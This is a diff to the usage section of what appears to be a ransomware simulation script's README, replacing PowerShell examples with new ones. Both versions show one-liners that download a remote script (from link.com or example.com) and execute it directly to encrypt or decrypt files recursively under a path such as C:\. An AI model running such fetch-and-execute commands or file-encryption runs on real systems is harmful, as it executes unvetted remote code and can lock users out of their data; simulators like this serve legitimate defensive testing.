@@ -1,7 +1,14 @@
-# Encrypt
-`iex ((New-Object Net.WebClient).DownloadString('https://link.com/RansSim.ps1')) -Path 'C:\' -Extension 'docx','xlsx' -Recurse`
+# Usage Examples
 
-# Decrypt
-`iex ((New-Object Net.WebClient).DownloadString('https://link.com/RansSim.ps1')) -Path 'C:\' -Recurse -Decrypt`
+## Execute directly from web:
+```
+& ([scriptblock]::Create((irm https://example.com/script.ps1))) -Path "C:\Test" -Extensions @("txt","doc","pdf") -Recurse
+```
 
-Make sure to replace link and path.
+## Local execution:
+
+```
+.\script.ps1 -Path "C:\Users\test\Documents" -Extensions "txt","docx" -Recurse:$true
+```
+
+> Make sure to change link and path
